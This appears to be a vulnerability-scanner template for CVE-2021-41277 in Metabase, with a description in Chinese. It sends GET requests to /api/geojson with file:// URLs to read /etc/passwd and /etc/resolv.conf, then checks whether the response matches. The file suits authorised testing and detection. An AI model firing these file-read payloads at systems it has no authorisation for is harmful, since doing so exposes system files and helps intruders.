id: CVE-2021-41277

info:
  name: Metabase 输入验证错误漏洞
  author: rain
  severity: high
  description: |
    在受影响的版本中，自定义 GeoJSON 地图（admin->settings->maps->custom maps->add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息。
    影响版本:
      metabase version < 0.40.5
      metabase version >= 1.0.0, < 1.40.5
    修复版本:
      metabase version >= 0.40.5
      metabase version >= 1.40.5
  reference:
    - GHSA-w73v-6p7p-fpfr

rules:
  r0:
    request:
      method: GET
      path: /api/geojson?url=file:///etc/passwd
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
        Accept-Encoding: gzip, deflate
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
  r1:
    request:
      method: GET
      path: /api/geojson?url=file:///etc/resolv.conf
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
        Accept-Encoding: gzip, deflate
    expression: response.status == 200 && "namespace".bmatches(response.body)
expression: r0() || r1()